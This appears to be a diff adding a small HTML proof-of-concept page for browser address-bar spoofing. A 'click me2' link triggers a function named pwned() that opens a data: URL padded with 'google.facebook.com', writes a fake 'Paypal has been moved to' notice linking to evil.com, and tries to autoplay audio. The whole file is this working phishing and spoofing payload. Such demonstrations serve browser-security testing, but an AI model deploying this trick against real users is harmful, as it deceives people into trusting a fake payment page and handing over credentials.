@@ -1,0 +1,22 @@
+<script>
+function pwned() {
+    var t = window.open('data:#verylongurl.google.facebook.com');
+    
+    // Add content to the new window
+    t.document.write(`
+        <h1>Paypal has been moved to</h1>
+        <a href="https://evil.com">Evil.com</a>
+    `);
+
+    // Create an audio element and attempt to play it
+    var audio = new Audio('https://www.example.com/audiofile.mp3');
+    audio.autoplay = true;
+
+    // This may trigger an autoplay prompt based on the browser settings
+    t.document.body.appendChild(audio);
+
+    t.stop();
+}
+</script>
+
+<a href="https://legitsite.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a>
